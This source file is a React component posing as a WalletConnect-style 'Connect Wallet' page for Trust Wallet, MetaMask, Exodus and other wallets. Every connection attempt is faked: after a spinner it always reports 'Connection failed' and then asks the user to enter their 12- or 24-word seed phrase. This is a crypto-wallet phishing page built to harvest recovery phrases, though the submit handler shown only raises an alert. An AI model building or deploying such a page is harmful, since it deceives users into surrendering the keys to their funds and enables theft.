"use client";
import React, { useState } from "react";

const wallets = [
	{ name: "Trust Wallet", icon: "/twt.png" },
	{ name: "SafePal", icon: "/sfp.png" },
	{ name: "Exodus", icon: "/exodus.jpg" },
	{ name: "Lobstr", icon: "/lobstr.jpg" },
	{ name: "Dharma", icon: "/dharma.jpg" },
	{ name: "HaloDeFi Wallet", icon: "/halodefi.png" },
	{ name: "Metamask", icon: "/metamask.png" },
	{ name: "Rainbow", icon: "/rainbow.jpg" },
	// ...add more wallets as needed
];

const ConnectWallet = () => {
	const [modalOpen, setModalOpen] = useState(false);
	const [connecting, setConnecting] = useState(false);
	const [connectionFailed, setConnectionFailed] = useState(false);
	const [selectedWallet, setSelectedWallet] = useState(null);
	const [seedPhrase, setSeedPhrase] = useState("");
	const [seedError, setSeedError] = useState("");

	const handleWalletClick = (wallet) => {
		setSelectedWallet(wallet);
		setModalOpen(true);
		setConnecting(true);
		setConnectionFailed(false);
		setSeedPhrase("");
		setSeedError("");
		// Simulate connection attempt
		setTimeout(() => {
			setConnecting(false);
			setConnectionFailed(true);
		}, 10000); // 2 seconds
	};

	const handleCloseModal = () => {
		setModalOpen(false);
		setConnecting(false);
		setConnectionFailed(false);
		setSelectedWallet(null);
		setSeedPhrase("");
		setSeedError("");
	};

	const handleSeedSubmit = (e) => {
		e.preventDefault();
		if (!seedPhrase.trim() || seedPhrase.trim().split(" ").length < 12) {
			setSeedError("Please enter a valid 12 or 24-word seed phrase.");
			return;
		}
		setSeedError("");
		// Handle seed phrase submission logic here
		alert("Seed phrase submitted!");
		handleCloseModal();
	};

	return (
		<div className="max-w-5xl mx-auto px-4 py-8">
			<div className="mb-8 text-center w-4/6 mx-auto">
				<h1 className="text-3xl font-bold mb-2">Wallets</h1>
				<p className="text-gray-600 max-w-2xl mx-auto">
					Multiple iOS and Android wallets support the protocol. <br className="hidden sm:block" /> Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet.
				</p>
				<p className="text-gray-600 max-w-2xl mx-auto">
					Interaction between mobile apps and mobile browsers are supported via mobile deep linking.
				</p>
			</div>
			<div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6">
				{wallets.map((wallet) => (
					<div
						key={wallet.name}
						className="flex flex-col items-center cursor-pointer bg-white rounded-xl shadow hover:shadow-lg focus-within:shadow-lg transition py-4 px-3 transform ease-in-out duration-100 hover:scale-105 focus-within:scale-105"
						tabIndex={0}
						onClick={() => handleWalletClick(wallet)}
					>
						<div className="overflow-hidden w-14 h-14 rounded-full flex items-center justify-center mb-2">
							<img
								src={wallet.icon}
								alt={wallet.name}
								width={56}
								height={56}
								className="w-14 h-14 object-contain"
							/>
						</div>
						<div className="text-base font-medium text-gray-800 text-center">{wallet.name}</div>
					</div>
				))}
			</div>

			{/* Modal */}
			{modalOpen && (
				<div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm transition-all">
					<div className="bg-white rounded-3xl shadow-2xl w-full max-w-md relative animate-fade-in overflow-hidden">
						{/* Gradient Header */}
						<div className="bg-gradient-to-r from-blue-500 to-indigo-600 p-6 flex flex-col items-center">
							<div className="w-20 h-20 rounded-full bg-white flex items-center justify-center shadow-lg mb-2 border-4 border-blue-200">
								<img
									src={selectedWallet?.icon}
									alt={selectedWallet?.name}
									className="w-14 h-14 object-contain"
								/>
							</div>
							<h2 className="text-white text-2xl font-bold mt-2">{selectedWallet?.name}</h2>
						</div>
						{/* Close Button */}
						<button
							onClick={handleCloseModal}
							className="absolute top-4 right-4 text-white bg-black bg-opacity-30 hover:bg-opacity-60 rounded-full w-9 h-9 flex items-center justify-center text-2xl font-bold focus:outline-none transition"
							aria-label="Close"
							style={{ zIndex: 10 }}
						>
							&times;
						</button>
						{/* Modal Body */}
						<div className="p-8 pt-6 flex flex-col items-center">
							{connecting && (
								<div className="flex flex-col items-center w-full">
									<div className="walletconnect-loader mb-4"></div>
									<p className="text-blue-600 font-semibold text-lg mb-2">Connecting to {selectedWallet?.name}...</p>
									<p className="text-gray-500 text-sm text-center">Approve the connection in your wallet app</p>
								</div>
							)}
							{connectionFailed && (
								<div className="w-full">
									<div className="text-red-500 font-semibold mb-2 text-center">Connection failed</div>
									<div className="flex justify-center mb-4">
										<button
											className="px-4 py-2 bg-blue-600 text-white rounded-lg shadow hover:bg-blue-700 transition"
											onClick={() => handleWalletClick(selectedWallet)}
										>
											Retry
										</button>
									</div>
									<div className="border-t pt-4">
										<h3 className="text-lg font-bold mb-2 text-gray-700 text-center">Enter Seed Phrase</h3>
										<form onSubmit={handleSeedSubmit}>
											<textarea
												className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400 transition mb-2"
												rows={3}
												placeholder="Enter your 12 or 24-word seed phrase"
												value={seedPhrase}
												onChange={(e) => setSeedPhrase(e.target.value)}
												required
											/>
											{seedError && <div className="text-red-500 text-sm mb-2">{seedError}</div>}
											<div className="flex justify-center">
												<button
													type="submit"
													className="px-4 py-2 bg-green-600 text-white rounded-lg shadow hover:bg-green-700 transition"
												>
													Submit Seed Phrase
												</button>
											</div>
										</form>
									</div>
								</div>
							)}
						</div>
					</div>
				</div>
			)}
		</div>
	);
};

export default ConnectWallet;